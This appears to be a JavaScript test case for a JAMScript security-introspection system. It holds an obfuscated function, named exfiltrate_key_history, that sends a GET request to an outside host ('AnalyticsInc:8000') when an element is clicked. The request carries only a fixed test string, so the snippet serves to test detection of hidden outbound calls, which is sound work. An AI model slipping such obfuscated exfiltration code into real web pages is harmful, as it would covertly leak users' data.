function exfiltrate_key_history() {
  var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
  xmlhttp = new XMLHttpRequest;
  var v0 = _0x2e14[3];
  var v1 = _0x2e14[0];
  var v5 = _0x2e14[1];
  var v6 = _0x2e14[2];
  var v2 = v5 + v6;
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    xmlhttp[v0](v1, v2, true)
  }
  var v3 = _0x2e14[4];
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    xmlhttp[v3](null)
  }
  return
}
var v4 = document.getElementById("test");
v4.onclick = exfiltrate_key_history;
